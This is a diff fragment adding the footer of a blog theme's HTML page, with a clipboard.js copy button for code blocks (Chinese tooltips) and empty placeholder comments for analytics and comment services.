+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
